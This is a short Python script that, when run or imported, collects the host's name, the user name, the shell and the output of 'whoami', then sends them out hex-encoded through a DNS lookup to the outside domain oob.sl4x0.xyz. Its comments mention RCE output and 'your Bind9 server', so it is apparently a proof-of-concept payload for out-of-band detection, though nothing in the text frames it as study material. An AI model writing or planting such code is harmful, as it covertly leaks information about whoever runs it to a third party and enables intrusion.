import os
import socket
import uuid
import base64
import subprocess

def exfiltrate():
    uid = str(uuid.uuid4())[:8]
    hostname = os.uname()[1]
    user = os.getenv("USER") or os.getenv("USERNAME") or "unknown"
    shell = os.getenv("SHELL") or "noshell"
    home = os.getenv("HOME") or "nohome"
    
    # Optional RCE output - simple harmless cmd
    try:
        cmd_output = subprocess.check_output(["whoami"], stderr=subprocess.DEVNULL).decode().strip()
    except Exception:
        cmd_output = "fail"

    # Compress & limit payload (DNS-safe)
    marker = "docinf"
    data = f"{uid}:{hostname}:{user}:{shell}:{cmd_output}:{marker}"
    hexdata = base64.b16encode(data.encode()).decode().lower()[:50]  # DNS label limit

    try:
        # Send DNS request to your Bind9 server
        socket.gethostbyname(f"{hexdata}.oob.sl4x0.xyz")
    except Exception:
        pass

exfiltrate()
